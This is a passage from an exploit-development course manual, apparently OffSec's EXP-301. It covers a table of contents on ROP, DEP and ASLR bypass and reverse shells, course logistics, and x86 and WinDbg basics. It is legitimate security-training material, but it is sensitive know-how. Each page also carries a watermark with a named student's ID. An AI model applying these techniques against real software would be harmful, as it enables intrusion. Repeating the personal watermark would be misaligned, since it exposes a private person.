7.6.5 
Calling CreateProcessA ........................................................................................................ 285 
7.6.5.1 
Exercises ........................................................................................................................ 290 
7.6.5.2 
Extra Miles ...................................................................................................................... 291 
7.7 
Wrapping Up ................................................................................................................................ 291 
8 
Reverse Engineering for Bugs ............................................................................................................ 292 
8.1 
Installation and Enumeration ................................................................................................... 292 
8.1.1 
Installing Tivoli Storage Manager ....................................................................................... 293 
8.1.1.1 
Exercise ........................................................................................................................... 294 
8.1.2 
Enumerating an Application ................................................................................................. 294 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
9 
8.1.2.1 
Exercises ........................................................................................................................ 296 
8.2 
Interacting with Tivoli Storage Manager ................................................................................ 296 
8.2.1 
Hooking the recv API ............................................................................................................. 296 
8.2.1.1 
Exercises ........................................................................................................................ 299 
8.2.2 
Synchronizing WinDbg and IDA Pro ................................................................................... 299 
8.2.2.1 
Exercises ........................................................................................................................ 301 
8.2.3 
Tracing the Input .................................................................................................................... 301 
8.2.3.1 
Exercise ........................................................................................................................... 304 
8.2.4 
Checksum, Please .................................................................................................................. 304 
8.2.4.1 
Exercise ........................................................................................................................... 320 
8.3 
Reverse Engineering the Protocol ........................................................................................... 320 
8.3.1 
Header-Data Separation ....................................................................................................... 320 
8.3.1.1 
Exercise ........................................................................................................................... 332 
8.3.2 
Reversing the Header ............................................................................................................ 333 
8.3.2.1 
Exercises ........................................................................................................................ 342 
8.3.3 
Exploiting Memcpy ................................................................................................................ 342 
8.3.3.1 
Exercise ........................................................................................................................... 348 
8.3.4 
Getting EIP Control ................................................................................................................ 348 
8.3.4.1 
Exercise ........................................................................................................................... 351 
8.3.4.2 
Extra Mile ........................................................................................................................ 351 
8.4 
Digging Deeper to Find More Bugs ......................................................................................... 351 
8.4.1 
Switching Execution .............................................................................................................. 352 
8.4.1.1 
Exercises ........................................................................................................................ 357 
8.4.2 
Going Down 0x534 ................................................................................................................ 357 
8.4.2.1 
Exercises ........................................................................................................................ 367 
8.4.2.2 
Extra Mile ........................................................................................................................ 367 
8.4.2.3 
Extra Mile ........................................................................................................................ 367 
8.5 
Wrapping Up ................................................................................................................................ 368 
9 
Stack Overflows and DEP Bypass ..................................................................................................... 369 
9.1 
Data Execution Prevention ........................................................................................................ 369 
9.1.1 
DEP Theory .............................................................................................................................. 369 
9.1.1.1 
Exercises ........................................................................................................................ 371 
9.1.2 
Windows Defender Exploit Guard ....................................................................................... 372 
9.1.2.1 
Exercises ........................................................................................................................ 375 
9.2 
Return Oriented Programming ................................................................................................. 375 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
10 
9.2.1 
Origins of Return Oriented Programming Exploitation ................................................... 375 
9.2.2 
Return Oriented Programming Evolution .......................................................................... 376 
9.3 
Gadget Selection ......................................................................................................................... 379 
9.3.1 
Debugger Automation: Pykd ................................................................................................ 379 
9.3.1.1 
Exercises ........................................................................................................................ 388 
9.3.2 
Optimized Gadget Discovery: RP++ ................................................................................... 388 
9.3.2.1 
Exercises ........................................................................................................................ 390 
9.4 
Bypassing DEP ............................................................................................................................ 390 
9.4.1 
Getting The Offset .................................................................................................................. 391 
9.4.1.1 
Exercises ........................................................................................................................ 393 
9.4.2 
Locating Gadgets ................................................................................................................... 393 
9.4.2.1 
Exercise ........................................................................................................................... 394 
9.4.3 
Preparing the Battlefield ....................................................................................................... 394 
9.4.3.1 
Exercises ........................................................................................................................ 397 
9.4.4 
Making ROP’s Acquaintance ................................................................................................ 397 
9.4.4.1 
Exercises ........................................................................................................................ 399 
9.4.5 
Obtaining VirtualAlloc Address ............................................................................................ 400 
9.4.5.1 
Exercises ........................................................................................................................ 408 
9.4.6 
Patching the Return Address ............................................................................................... 408 
9.4.6.1 
Exercises ........................................................................................................................ 413 
9.4.7 
Patching Arguments .............................................................................................................. 414 
9.4.7.1 
Exercises ........................................................................................................................ 420 
9.4.8 
Executing VirtualAlloc ........................................................................................................... 421 
9.4.8.1 
Exercises ........................................................................................................................ 426 
9.4.9 
Getting a Reverse Shell ......................................................................................................... 427 
9.4.9.1 
Exercises ........................................................................................................................ 428 
9.4.9.2 
Extra Mile ........................................................................................................................ 428 
9.4.9.3 
Extra Mile ........................................................................................................................ 429 
9.4.9.4 
Extra Mile ........................................................................................................................ 429 
9.5 
Wrapping Up ................................................................................................................................ 429 
10 
Stack Overflows and ASLR Bypass .............................................................................................. 430 
10.1 
ASLR Introduction ...................................................................................................................... 430 
10.1.1 
ASLR Implementation ....................................................................................................... 430 
10.1.2 
ASLR Bypass Theory ........................................................................................................ 431 
10.1.3 
Windows Defender Exploit Guard and ASLR ................................................................ 433 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
11 
10.1.3.1 
Exercises .................................................................................................................... 438 
10.2 
Finding Hidden Gems ................................................................................................................ 438 
10.2.1 
FXCLI_DebugDispatch ...................................................................................................... 438 
10.2.1.1 
Exercises .................................................................................................................... 444 
10.2.2 
Arbitrary Symbol Resolution ............................................................................................ 444 
10.2.2.1 
Exercises .................................................................................................................... 451 
10.2.3 
Returning the Goods ......................................................................................................... 451 
10.2.3.1 
Exercises .................................................................................................................... 460 
10.3 
Expanding our Exploit (ASLR Bypass) .................................................................................... 460 
10.3.1 
Leaking an IBM Module .................................................................................................... 461 
10.3.1.1 
Exercises .................................................................................................................... 463 
10.3.2 
Is That a Bad Character? .................................................................................................. 463 
10.3.2.1 
Exercises .................................................................................................................... 465 
10.4 
Bypassing DEP with WriteProcessMemory .......................................................................... 466 
10.4.1 
WriteProcessMemory ....................................................................................................... 466 
10.4.1.1 
Exercises .................................................................................................................... 478 
10.4.2 
Getting Our Shell ................................................................................................................ 478 
10.4.2.1 
Exercises .................................................................................................................... 481 
10.4.3 
Handmade ROP Decoder ................................................................................................. 481 
10.4.3.1 
Exercises .................................................................................................................... 487 
10.4.4 
Automating the Shellcode Encoding ............................................................................. 487 
10.4.4.1 
Exercises .................................................................................................................... 488 
10.4.5 
Automating the ROP Decoder ......................................................................................... 488 
10.4.5.1 
Exercises .................................................................................................................... 494 
10.4.5.2 
Extra Mile ................................................................................................................... 494 
10.4.5.3 
Extra Mile ................................................................................................................... 494 
10.4.5.4 
Extra Mile ................................................................................................................... 495 
10.4.5.5 
Extra Mile ................................................................................................................... 495 
10.5 
Wrapping Up ................................................................................................................................ 495 
11 
Format String Specifier Attack Part I ............................................................................................ 496 
11.1 
Format String Attacks ................................................................................................................ 496 
11.1.1 
Format String Theory ........................................................................................................ 496 
11.1.2 
Exploiting Format String Specifiers ............................................................................... 498 
11.1.2.1 
Exercise ...................................................................................................................... 501 
11.2 
Attacking IBM Tivoli FastBackServer ...................................................................................... 501 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
12 
11.2.1 
Investigating the EventLog Function ............................................................................. 501 
11.2.1.1 
Exercise ...................................................................................................................... 505 
11.2.2 
Reverse Engineering a Path ............................................................................................. 505 
11.2.2.1 
Exercises .................................................................................................................... 511 
11.2.3 
Invoke the Specifiers ......................................................................................................... 511 
11.2.3.1 
Exercise ...................................................................................................................... 515 
11.3 
Reading the Event Log ............................................................................................................... 516 
11.3.1 
The Tivoli Event Log .......................................................................................................... 516 
11.3.1.1 
Exercise ...................................................................................................................... 520 
11.3.2 
Remote Event Log Service ............................................................................................... 520 
11.3.2.1 
Exercise ...................................................................................................................... 528 
11.3.3 
Read From an Index .......................................................................................................... 528 
11.3.3.1 
Exercise ...................................................................................................................... 539 
11.3.4 
Read From the Log ............................................................................................................ 539 
11.3.4.1 
Exercise ...................................................................................................................... 544 
11.3.5 
Return the Log Content .................................................................................................... 545 
11.3.5.1 
Exercises .................................................................................................................... 548 
11.4 
Bypassing ASLR with Format Strings ..................................................................................... 548 
11.4.1 
Parsing the Event Log ....................................................................................................... 548 
11.4.1.1 
Exercises .................................................................................................................... 553 
11.4.2 
Leak Stack Address Remotely ........................................................................................ 554 
11.4.2.1 
Exercises .................................................................................................................... 557 
11.4.3 
Saving the Stack ................................................................................................................ 557 
11.4.3.1 
Exercises .................................................................................................................... 559 
11.4.4 
Bypassing ASLR ................................................................................................................. 559 
11.4.4.1 
Exercises .................................................................................................................... 566 
11.4.4.2 
Extra Mile ................................................................................................................... 567 
11.4.4.3 
Extra Mile ................................................................................................................... 567 
11.5 
Wrapping Up ................................................................................................................................ 567 
12 
Format String Specifier Attack Part II ........................................................................................... 568 
12.1 
Write Primitive with Format Strings ........................................................................................ 568 
12.1.1 
Format String Specifiers Revisited ................................................................................. 568 
12.1.1.1 
Exercise ...................................................................................................................... 570 
12.1.2 
Overcoming Limitations ................................................................................................... 570 
12.1.2.1 
Exercises .................................................................................................................... 578 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
13 
12.1.3 
Write to the Stack .............................................................................................................. 578 
12.1.3.1 
Exercises .................................................................................................................... 582 
12.1.4 
Going for a DWORD ........................................................................................................... 583 
12.1.4.1 
Exercises .................................................................................................................... 584 
12.2 
Overwriting EIP with Format Strings ....................................................................................... 584 
12.2.1 
Locating a Target .............................................................................................................. 585 
12.2.1.1 
Exercises .................................................................................................................... 587 
12.2.2 
Obtaining EIP Control ....................................................................................................... 587 
12.2.2.1 
Exercise ...................................................................................................................... 588 
12.3 
Locating Storage Space ............................................................................................................ 589 
12.3.1 
Finding Buffers ................................................................................................................... 589 
12.3.1.1 
Exercises .................................................................................................................... 592 
12.3.2 
Stack Pivot .......................................................................................................................... 592 
12.3.2.1 
Exercise ...................................................................................................................... 595 
12.4 
Getting Code Execution ............................................................................................................. 595 
12.4.1 
ROP Limitations ................................................................................................................. 595 
12.4.1.1 
Exercises .................................................................................................................... 599 
12.4.2 
Getting a Shell .................................................................................................................... 599 
12.4.2.1 
Exercises .................................................................................................................... 600 
12.5 
Wrapping Up ................................................................................................................................ 600 
13 
Trying Harder: The Labs .................................................................................................................. 601 
13.1 
Challenge 1 .................................................................................................................................. 601 
13.2 
Challenge 2 .................................................................................................................................. 601 
13.3 
Challenge 3 .................................................................................................................................. 602 
13.4 
Wrapping Up ................................................................................................................................ 604 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
14 
 
1 Windows User Mode Exploit Development: General 
Course Information 
Welcome to the Windows User Mode Exploit Development (EXP-301) course! 
EXP-301 was designed for security professionals who already have some experience in finding 
known vulnerabilities and using public exploits to attack them. 
This course will encompass beginner-to-intermediate exploit development for binary applications 
on the Windows operating system. It will also provide an introduction to reverse engineering 
binary applications to help locate vulnerabilities. 
1.1 About the EXP-301 Course 
Before diving into the course material, let’s cover some basic terminology. 
The concept of exploit development applies to many areas of offensive security. For instance, we 
might locate vulnerabilities in web applications and craft exploits to attack them, or abuse 
insecure configurations related to service or file permissions. 
To narrow the scope, this course focuses on applications that are written in low-level languages 
such as C++ and then compiled into binary code. For such applications, source code is often 
unavailable when searching for vulnerabilities or developing an exploit. 
Once code written in low-level languages has been compiled, it cannot easily be decompiled. This 
is different from high-level languages, such as C# or Java, in which the code is only compiled into 
an intermediate bytecode format. 
Since we’ll attack applications written in low-level languages, we will need to work with the code’s 
binary representation. This means we will tackle low-level mechanisms including direct memory 
manipulations, assembly code, processor flags, and registers. 
In Windows binary exploitation, there are many avenues to explore, and to obtain a firm 
understanding of exploit development, it is important to build a strong foundation. To further 
tighten the scope, this course will cover exploitation techniques and vulnerabilities in server side 
applications that do not contain internal scripting engines. This excludes applications like web 
browsers. 
While the majority of Windows operating systems in use today are 64-bit, many applications are 
32-bit. This is possible on the Windows platform due to the Windows on Windows 64 (wow64) 
implementation.1 On workstations this includes applications like the Microsoft Office suite and 
many enterprise server side applications are also still 32-bit. 
EXP-301 will focus exclusively on the 32-bit architecture, due to the huge amount of knowledge 
required to learn and become proficient in exploit development. It should also be noted that most 
techniques on 32-bit can be adapted to 64-bit, so learning them in-depth on 32-bit is important. 
 
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
15 
Attackers require a base of overlapping knowledge to both find a vulnerability and craft an exploit. 
You will develop this knowledge base through the modules in this course. 
EXP-301 begins by covering Instruction Pointer (EIP) and Structured Exception Handling (SEH) 
overwrites, along with egghunters and how to create custom shellcode. We move on to learning 
reverse engineering techniques by using IDA Pro, next exploring how to bypass Data Execution 
Prevention (DEP) with Return-Oriented Programming (ROP). The final modules in this course 
cover advanced custom-made ROP chains, bypassing Address Space Layout Randomization 
(ASLR), and how to create and use read and write primitives to achieve complex attacks. 
1.2 Provided Materials 
Let’s take a moment to review the individual components of the course. At this point, you should 
have access to the following: 
• 
The EXP-301 course materials 
• 
The internal VPN lab network 
• 
Student forum credentials 
• 
Live support 
• 
OSED exam attempt/s 
Next, we’ll cover each of these items in detail. 
1.2.1 EXP-301 Course Materials 
The course includes various book modules and the accompanying course videos. The 
information covered in book module and the videos are complementary, meaning you can read 
the book modules and then watch the videos to fill in any gaps, or vice-versa. 
In some modules, the book modules are more detailed than the videos. In other cases, the videos 
may convey some information better than the book modules. It is important that you pay close 
attention to both. 
The book module also contains exercises for each chapter. Completing the course exercises will 
help you solidify your knowledge and practice the skills needed to attack and compromise 
applications. 
1.2.2 Access to the EXP-301 VPN Lab Network 
Once you have signed up for the course, you will be able to download the VPN pack required to 
access the lab network via the course lab page in the Offsec Training Library. This will enable you 
to access the EXP-301 VPN lab network, where you will be spending a considerable amount of 
time. 
Lab time starts when your course begins and is metered as continuous access. 
If your lab time expires, or is about to expire, you can purchase a lab extension at any time. To 
purchase additional lab time, use the “Extend” link available at top right corner of the Offsec 
Training Library. If you purchase a lab extension while your lab access is still active, you can 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
16 
continue to use the same VPN connectivity pack. If you purchase a lab extension after your 
existing lab access has ended, you will need to download a new VPN connectivity pack via the 
course lab page in the Offsec Training Library. 
Students who have purchased a subscription will have access to the lab as long as the 
subscription is active. Your subscription will be automatically renewed, unless cancelled via the 
billing page. 
1.2.3 The Offensive Security Student Forum 
The Student Forum2 is only accessible to Offensive Security students. Access does not expire 
when your lab time ends. You can continue to enjoy the forums long after you pass your OSED 
exam. 
On the forum, you can ask questions, share interesting resources, and offer tips (as long as there 
are no spoilers). We ask all forum members to be mindful of what they post, taking particular care 
not to ruin the overall course experience for others by posting complete solutions. Inappropriate 
posts may be moderated. 
Once you have successfully passed the OSED exam, you will gain access to the sub-forum for 
certificate holders. 
1.2.4 Live Support 
Live Support can be accessed by clicking the “Connect to Discord” in the upper right hand corner 
of the Offsec Training Library. Live Support will allow you to directly communicate with our 
Student Administrators. 
Student Administrators are available to assist with technical issues, but they may also be able to 
clarify items in the course material and exercises. In addition, if you have tried your best and are 
completely stuck on a lab machine, Student Administrators may be able to provide a small hint to 
help you on your way. 
Remember that the information provided by the Student Administrators will be based on the 
amount of detail you are able to provide. The more detail you can give about what you’ve already 
tried and the outcomes you’ve been able to observe, the better. 
1.2.5 OSED Exam Attempt 
Included with your initial purchase of the EXP-301 course is an attempt at the Offensive Security 
Exploit Developer (OSED) certification. 
To book your OSED exam, go to your exam scheduling calendar. The calendar can be located in 
the OffSec Training Library under the course exam page. Here you will be able to see your exam 
expiry date, as well as schedule the exam for your preferred date and time. 
Keep in mind that you won’t be able to select a start time if the exam labs are full for that time 
period so we encourage you to schedule your exam as soon as possible. 
 
2 (Offensive Security, 2021), https://forums.offensive-security.com 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
17 
For additional information, please visit our support page.3 
1.3 Overall Strategies for Approaching the Course 
Each student is unique, so there is no single best way to approach this course and materials. We 
want to encourage you to move through the course at your own comfortable pace. You’ll also 
need to apply time management skills to keep yourself on track. 
We recommend the following as a very general approach to the course materials: 
1. 
Review all the information included in the resources provided after the registration process. 
2. 
Review the course materials. 
3. 
Complete the course exercises. 
4. 
Attack the target applications. 
1.3.1 Course Materials 
Once you have reviewed the information above, you can jump into the course material. You may 
opt to start with the course videos, then review the information for the same module in the book 
modules, or vice-versa depending on your preferred learning style. As you go through the course 
material, you may need to re-watch or re-read modules to fully absorb the content. 
You’ll note that there are course videos associated with all modules included in EXP-301 except 
this introduction and Trying Harder: The Labs. 
You will occasionally encounter text in a centered, blue font in the book modules. Text blocks 
presented in this way offer additional information that provides further context but is not required 
to follow the narrative of an attack. The information in these blocks is not mentioned in the 
course videos. 
We recommend approaching the course as a marathon and not a sprint. Don’t be afraid to spend 
extra time with difficult concepts before moving forward in the course. 
1.3.2 Course Exercises 
We recommend that you fully complete the exercises for each module prior to moving on to the 
next module. They will test your understanding of the material and build your confidence to move 
forward. 
Depending on your existing skillset, it may take considerable time and effort to complete the 
exercises. Nevertheless, we encourage you to be persistent, especially with tougher exercises. 
Persistence is an essential trait to develop as part of the OffSec “Try Harder” mindset. 
To aid in your studying the dedicated student vm contains the folder C:\proof_of_concepts. Inside 
this folder you will find exploit code for relevant exercises as marked by module, section and 
exercise numbers. Only exercises that result in an updated exploit code have entries in the list. 
 
3 (Offensive Security, 2021), https://help.offensive-security.com/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
18 
We encourage you to attempt to solve the exercises on your own before you read the solutions, 
as this will greatly increase your learning. 
Note that copy-pasting code from the book modules into a script may result in 
unintended whitespace or newlines due to formatting. 
Some modules include extra mile exercises, which are more difficult and time-consuming than 
regular exercises. These exercises are not required to learn the material, but they will you help 
develop extra skills and succeed on the exam. Also note that solutions to these extra miles are 
not given on your student vm. 
1.4 About the EXP-301 VPN Labs 
The EXP-301 labs provide an isolated environment where you can conduct both exploit 
development and reverse engineering. Machines in the labs have been loaded with the required 
applications and tools. 
We’ve also provided a number of extra applications for practicing your skills after completing the 
book modules and exercises. 
Note that all virtual machines in this course are assigned to you and are not shared with other 
students. 
1.4.1 Control Panel 
Once logged in to the EXP-301 VPN lab network, you can access the EXP-301 control panel. You 
can use the control panel to revert your lab machines or book your exam. 
1.4.2 Reverts 
Each student is provided with twelve reverts every 24 hours. Reverts enable you to return a 
particular lab machine to its pristine state. This counter is reset every day at 00:00 GMT +0. If you 
require additional reverts, you can contact a Student Administrator via email (help@offensive-
security.com) or contact Live Support for help resetting your revert counter. 
The minimum amount of time between lab machine reverts is five minutes. 
In the control panel, you will find a drop-down menu with the title Module VM. This entry is used 
for all modules in the course guide. Before starting on the exercises or following the information 
given in the course videos or book modules, you must access the control panel and revert the VM. 
After disconnecting from the VPN for an extended time period, any active virtual machine will be 
removed, and you’ll need to connect to the VPN again and request a revert. With this in mind, 
please be sure to copy any notes or developed scripts to your Kali Linux VM before disconnecting 
from the labs. 
After completing the course modules and associated exercises, you can select a number of 
challenges from the control panel. This will revert a machine containing a target application. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
19 
1.4.3 Kali Virtual Machine 
This course was created and designed with Kali Linux in mind. While you are free to use any 
operating system you desire, the book modules and course videos all depict commands as given 
in Kali Linux while running as a non-root user. 
Be aware that the Student Administrators only provide support for Kali Linux running on VMware, 
but you are free to use any other virtualization software. 
The recommended Kali Linux image4 is the newest stable release in a default 64-bit build. 
1.4.4 Lab Behavior and Lab Restrictions 
The following restrictions are strictly enforced in the internal VPN lab network. If you violate any 
of the restrictions below, Offensive Security reserves the right to disable your lab access. 
1. 
Do not ARP spoof or conduct any other type of poisoning or man-in-the-middle attacks 
against the network. 
2. 
Do not perform brute force attacks against the VPN infrastructure. 
3. 
Do not attempt to hack into other students’ clients or Kali machines. 
1.5 About the OSED Exam 
The OSED certification exam contains three separate tasks and includes topics from reverse 
engineering to exploit development. You’ll need to obtain at least 60 out of 100 points to pass the 
exam, which equates to fully completing two out of the three tasks. 
The environment is completely dedicated to you for the duration of the exam, and you will have 
47 hours and 45 minutes to complete it. 
To ensure the integrity of our certifications, the exam will be remotely proctored. You are required 
to be present 15 minutes before your exam start time to perform identity verification and other 
pre-exam tasks. In order to do so, click on the Exam tab in the Offsec Training Library, which is 
situated at the top right of your screen. During these pre-exam verification steps, you will be 
provided with a VPN connectivity pack. 
Once the exam has ended, you will have an additional 24 hours to put together your exam report 
and document your findings. You will be evaluated on quality and accuracy of the exam report, so 
please include as much detail as possible and make sure your findings are all reproducible. 
Once your exam files have been accepted, your exam will be graded and you will receive your 
results within ten business days. If you achieve a passing score, we will ask you to confirm your 
physical address so we can mail your certificate. If you have not achieved a passing score, we will 
notify you, and you may purchase a certification retake using the appropriate links. 
We highly recommend that you carefully schedule your exam for a two-day window when you can 
ensure no outside distractions or commitments. Exam availability is handled on a first come, first 
 
4 (Offensive Security, 2021), https://www.kali.org/downloads/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
20 
served basis, so it is best to schedule your exam as far in advance as possible to ensure your 
preferred date is available. 
For additional information regarding the exam, please review the OSED exam guide.5 
1.6 Wrapping Up 
In this module, we discussed important information needed to make the most of the EXP-301 
course and lab. We also covered how to prepare for, and then take, the final OSED exam. 
We wish you the best of luck on your EXP-301 journey and hope you enjoy the new challenges 
you will face. 
 
5 (Offensive Security, 2021), https://help.offensive-security.com/hc/en-us/articles/360052977212-OSED-Exam-Guide 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
21 
 
2 WinDbg and x86 Architecture 
In this module, we’ll introduce some fundamental concepts of x86 architecture including CPU 
registers, program memory, and function return mechanics. We’ll then learn the basic skills 
needed to debug an application with WinDbg. 
Practicing with WinDbg and mastering its commands is essential for tackling more complex 
exploitation topics later during this course. 
2.1 Introduction to x86 Architecture 
Before we can debug memory corruptions, we need to discuss program memory, understand 
how software works at the CPU level, and outline a few basic definitions. 
As we discuss these principles, we will refer quite often to Assembly (asm),6 an 
extremely low-level programming language that corresponds very closely to the 
CPU’s built-in machine code instructions. 
2.1.1 Program Memory 
When a binary application is executed, it allocates memory in a very specific way within the 
memory boundaries used by modern computers. Figure 1 shows how process memory is 
allocated in Windows between the lowest memory address (0x00000000) and the highest 
memory address (0x7FFFFFFF) used by applications: 
 
Figure 1: Anatomy of program memory in Windows 
 
6 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Assembly_language 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
22 
 
Although there are several memory areas outlined in this figure, in this module, we will solely 
focus on the stack. 
2.1.1.1 The Stack 
When a thread is running, it executes code from within the Program Image or from various 
Dynamic Link Libraries (DLLs).7 The thread requires a short-term data area for functions, local 
variables, and program control information, which is known as the stack.8 To facilitate the 
independent execution of multiple threads, each thread in a running application has its own stack. 
Stack memory is “viewed” by the CPU using a Last-In, First-Out (LIFO) structure. This essentially 
means that while accessing the stack, items put (“pushed”) on the top of the stack are removed 
(“popped”) first. The x86 architecture implements dedicated PUSH and POP assembly instructions 
to add or remove data to the stack respectively. 
2.1.1.2 Calling conventions 
Calling conventions9 describe how functions receive their parameters from their caller and how 
they return the result. The x86 architecture allows for the use of multiple calling conventions. The 
difference in their implementation consists of several factors such as how the parameters and 
return value are passed (placed in CPU registers,10 pushed on the stack, or both), in which order 
they are passed, how the stack is prepared and cleaned up before and after the call, and what 
CPU registers the called function must preserve for the caller. 
Generally speaking, the compiler determines which calling convention is used for all functions in a 
program, however, in some cases, it is possible for the programmer to specify a specific calling 
convention on a per-function basis. 
2.1.1.3 Function Return Mechanics 
When code within a thread calls a function, it must know which address to return to once the 
function completes. This “return address” (along with the function’s parameters and local 
variables) is stored on the stack. This collection of data is associated with one function call and is 
stored in a section of the stack memory known as a stack frame. An example of a stack frame is 
illustrated in Figure 2. 
 
Figure 2: Return address on the stack 
 
7 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-libraries 
8 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Stack-based_memory_allocation 
9 (Wikipedia, 2014), https://en.wikipedia.org/wiki/Calling_convention 
10 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x86-architecture 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
23 
 
When a function ends, the return address is taken from the stack and used to restore the 
execution flow to the calling function. 
While we’ve described the process at a high level, next we must understand more about how this 
is accomplished at the CPU level. This requires a discussion about CPU registers. 
2.1.2 CPU Registers 
To perform efficient code execution, the CPU maintains and uses a series of nine 32-bit registers 
(on a 32-bit architecture). Registers are small, extremely high-speed CPU storage locations where 
data can be efficiently read or manipulated. These nine registers, including the nomenclature for 
the higher and lower bits of those registers, are shown in Figure 3. 
 
Figure 3: X86 CPU registers 
The register names were established for 16-bit architectures and were then extended with the 
advent of the 32-bit (x86) platform, hence the letter “E” in the register acronyms. Each register 
may contain a 32-bit value (allowing values between 0 and 0xFFFFFFFF) or may contain 16-bit or 
8-bit values in the respective subregisters, as shown in the EAX register in Figure 4. 
 
Figure 4: 16-bit and 8-bit subregisters 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
24 
 
2.1.2.1 General Purpose Registers 
Several registers such as EAX, EBX, ECX, EDX, ESI, and EDI are often used as general purpose 
registers to store temporary data. There is much more to this discussion (as explained in various 
online resources11), but the primary registers for our purposes are described below: 
• 
EAX (accumulator): Arithmetical and logical instructions 
• 
EBX (base): Base pointer for memory addresses 
• 
ECX (counter): Loop, shift, and rotation counter 
• 
EDX (data): I/O port addressing, multiplication, and division 
• 
ESI (source index): Pointer addressing of data and source in string copy operations 
• 
EDI (destination index): Pointer addressing of data and destination in string copy operations 
2.1.2.2 ESP - The Stack Pointer 
As previously mentioned, the stack is used for storage of data, pointers, and arguments. Since the 
stack is dynamic and changes constantly during program execution, the stack pointer ESP keeps 
“track” of the most recently referenced location on the stack (top of the stack) by storing a pointer 
to it. 
A pointer is a reference to an address (or location) in memory. When we say a 
register “stores a pointer” or “points” to an address, this essentially means that 
the register is storing that target address. 
2.1.2.3 EBP - The Base Pointer 
Since the stack is in constant flux during the execution of a thread, it can become difficult for a 
function to locate its stack frame, which stores the required arguments, local variables, and the 
return address. EBP, the base pointer, solves this by storing a pointer to the top of the stack when 
a function is called. By accessing EBP, a function can easily reference information from its stack 
frame (via offsets) while executing. 
2.1.2.4 EIP - The Instruction Pointer 
EIP, the instruction pointer, is one of the most important registers for our purposes as it always 
points to the next code instruction to be executed. Since EIP essentially directs the flow of a 
program, it is an attacker’s primary target when exploiting any memory corruption vulnerability 
such as a buffer overflow. 
 
11 (SkullSecurity, 2012), https://wiki.skullsecurity.org/Registers 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
25 
2.2 Introduction to Windows Debugger 
Now that we understand the fundamental concepts of the x86 architecture, it is time to explore 
the debugging tool we will use throughout this course. 
There are several debugging programs available on Windows. OllyDbg12 and Immunity Debugger13 
are well-known in the reverse engineering and exploit development world for their user-friendly 
interface. Immunity Debugger originally began as a fork of OllyDbg but it has since surpassed 
OllyDbg’s functionality. 
Despite the convenience of these programs, we will use Microsoft WinDbg14 debugger exclusively 
in this course. This is because WinDbg provides the same scripting features available in Immunity 
Debugger, along with the availability of both 32- and 64-bit versions. While an open source 
implementation of OllyDbg for 64-bit exists, it does not provide the same features or support as 
WinDbg. 
WinDbg is also our preferred debugger because it can debug in both user-mode and kernel-mode, 
which makes it the best fit for the development of any kind of exploits leveraged on Windows. 
WinDbg is provided as part of the Software Development Kit (SDK), the Windows Driver Kit (WDK), 
and the Debugging Tools for Windows, free-of-charge. WinDbg is pre-installed on the course VM. 
Microsoft released a version of WinDbg called WinDbg Preview.15 It features a 
more intuitive interface as well as additional features such as time travel 
debugging16 and a JavaScript API17 for scripting support. However, WinDbg 
Preview only works on Windows 10 Anniversary Edition (1607/RS1) and newer 
versions. 
We will use the standard WinDbg version in this course to gain familiarity with the features 
available on all versions of WinDbg and avoid any compatibility issues. 
Leveraging WinDbg, we will learn how to use breakpoints to step through and control the flow of 
an application. We will use Notepad to create, read, and open a text file. Finally, we will explain the 
commands needed to display vital information and manipulate memory inside WinDbg. 
2.2.1 What is a Debugger? 
Let’s start with a quick refresher. A debugger is a computer program inserted between the target 
application and the CPU, in principle, acting like a proxy. 
 
12 (OllyDbg, 2019), http://www.ollydbg.de/ 
